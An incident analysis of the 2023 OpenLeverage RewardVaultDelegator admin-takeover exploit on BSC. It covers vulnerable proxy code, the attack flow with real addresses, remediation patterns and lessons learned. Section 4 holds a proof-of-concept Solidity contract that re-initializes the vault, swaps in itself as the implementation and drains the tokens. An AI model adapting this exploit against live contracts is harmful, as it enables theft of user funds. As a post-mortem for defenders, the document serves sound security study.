# OpenLeverage Admin Takeover Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | OpenLeverage (RewardVaultDelegator) |
| Date | 2023-10-16 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$8,000 USD |
| Attack Type | Unprotected Initialize Re-invocation + Admin Takeover |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x8ebd046992afe07eacce6b9b3878fdb45830f42b` |
| Attack Contract | `0x5366c6ba729d9cf8d472500afc1a2976ac2fe9ff` |
| Vulnerable Contract | `0x7bacb1c805cbbf7c4f74556a4b34fde7793d0887` (RewardVaultDelegator) |
| Fork Block | BSC |

## 2. Vulnerable Code Analysis

The `RewardVaultDelegator` contract used an upgradeable proxy pattern, but the `initialize()` function was publicly accessible with no re-initialization guard. The attacker called `initialize()` to set themselves as admin, used `setImplementation()` to point to a malicious implementation contract, then drained all tokens from the contract via the `a()` function.

```solidity
// Vulnerable pattern: re-invocable initialize + setImplementation
contract RewardVaultDelegator {
    address public admin;
    address public implementation;

    // Vulnerable: no initialized check — anyone can re-initialize
    function initialize(
        address _admin,
        address _implementation,
        uint64 _version
    ) external {
        // require(!initialized, "Already initialized") missing
        admin = _admin;
        implementation = _implementation;
    }

    // Vulnerable: once attacker becomes admin, arbitrary implementation can be set
    function setImplementation(address _implementation) external {
        require(msg.sender == admin, "Not admin");
        implementation = _implementation;
    }

    // Executes implementation via delegatecall
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

**Vulnerability**: The `initialize()` function lacked a re-initialization guard (`initialized` flag), allowing anyone to call it and change the admin. The attacker exploited this to drain multiple tokens including RACA, FLOKI, OLE, CSIX, and BABY.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Unprotected Initialize Re-invocation + Admin Takeover
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x8ebd046992afe07eacce6b9b3878fdb45830f42b]
  │
  ├─1─▶ RewardVaultDelegator.initialize(
  │          address(this),  // set attacker as admin
  │          address(this),  // set attacker contract as implementation
  │          uint64(1)
  │      )
  │      [RewardVaultDelegator: 0x7bacb1c805cbbf7c4f74556a4b34fde7793d0887]
  │      No re-initialization guard → attacker gains admin
  │
  ├─2─▶ RewardVaultDelegator.setImplementation(address(this))
  │      Sets malicious implementation (redirects delegatecall target)
  │
  ├─3─▶ RewardVaultDelegator.a(address(this))
  │      → delegatecall to attacker's a() function
  │      → transfers all tokens held by the contract
  │      [RACA: 0x12BB890508c125661E03b09EC06E404bc9289040]
  │      [BUSDT: 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
  │      [FLOKI: 0xfb5B838b6cfEEdC2873aB27866079AC55363D37E]
  │      [OLE: 0xa865197A84E780957422237B5D152772654341F3]
  │      [CSIX: 0x04756126F044634C9a0f0E985e60c88a51ACC206]
  │      [BABY: 0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657]
  │
  └─4─▶ Multiple tokens → swapped to BUSDT + profit realized (~$8,000)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IRewardVaultDelegator {
    function initialize(address admin, address implementation, uint64 version) external;
    function setImplementation(address implementation) external;
}

contract OpenLeverageExploit {
    IRewardVaultDelegator vault = IRewardVaultDelegator(0x7bacb1c805cbbf7c4f74556a4b34fde7793d0887);
    IERC20 RACA = IERC20(0x12BB890508c125661E03b09EC06E404bc9289040);
    IERC20 BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 FLOKI = IERC20(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E);
    Uni_Router_V2 router;

    function testExploit() external {
        // 1. Re-initialize: set self as admin
        vault.initialize(address(this), address(this), uint64(1));

        // 2. Replace with malicious implementation
        vault.setImplementation(address(this));

        // 3. Drain tokens via delegatecall
        (bool success,) = address(vault).call(
            abi.encodeWithSelector(this.a.selector, address(this))
        );
        require(success, "Exploit failed");
    }

    // Function executed in vault's context via delegatecall
    function a(address recipient) external {
        // Transfer all tokens held by the vault
        address[] memory tokens = new address[](6);
        tokens[0] = address(RACA);
        tokens[1] = address(BUSDT);
        tokens[2] = address(FLOKI);
        // ... remaining tokens

        for (uint i = 0; i < tokens.length; i++) {
            uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
            if (balance > 0) {
                IERC20(tokens[i]).transfer(recipient, balance);
            }
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Re-invocable initialize(), Admin Takeover |
| Impact Scope | Full token balance of RewardVaultDelegator |
| Explorer | [BSCscan](https://bscscan.com/address/0x7bacb1c805cbbf7c4f74556a4b34fde7793d0887) |

## 6. Security Recommendations

```solidity
// Fix 1: Prevent re-initialization using the initializer modifier
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract RewardVaultDelegator is Initializable {
    function initialize(
        address _admin,
        address _implementation,
        uint64 _version
    ) external initializer {  // OZ initializer modifier — can only run once
        admin = _admin;
        implementation = _implementation;
    }
}

// Fix 2: Manual initialized flag
contract RewardVaultDelegator {
    bool private initialized;

    function initialize(address _admin, address _implementation, uint64 _version) external {
        require(!initialized, "Already initialized");
        initialized = true;
        admin = _admin;
        implementation = _implementation;
    }
}

// Fix 3: Timelock + multisig on setImplementation
uint256 public implementationDelay;
address public pendingImplementation;
uint256 public implementationTimestamp;

function proposeImplementation(address newImpl) external onlyAdmin {
    pendingImplementation = newImpl;
    implementationTimestamp = block.timestamp + 2 days;
}

function executeImplementationChange() external onlyAdmin {
    require(block.timestamp >= implementationTimestamp, "Timelock not expired");
    implementation = pendingImplementation;
}
```

## 7. Lessons Learned

1. **Prevent initialize() Re-invocation**: The `initialize()` function of an upgradeable proxy must be executable only once. Use OpenZeppelin's `Initializable.initializer` modifier or implement an `initialized` flag manually.
2. **Secure setImplementation**: Functions that change the implementation contract must be protected by a timelock and multisig. An immediate implementation swap places the entire system under attacker control.
3. **delegatecall Context Risk**: Because delegatecall executes in the caller's (proxy's) context, a malicious implementation contract has full access to all state and balances of the proxy.
4. **Contracts Holding Multiple Tokens**: A Reward Vault contract holding multiple tokens can lose its entire asset base through a single access control vulnerability. Admin functions require layered security controls.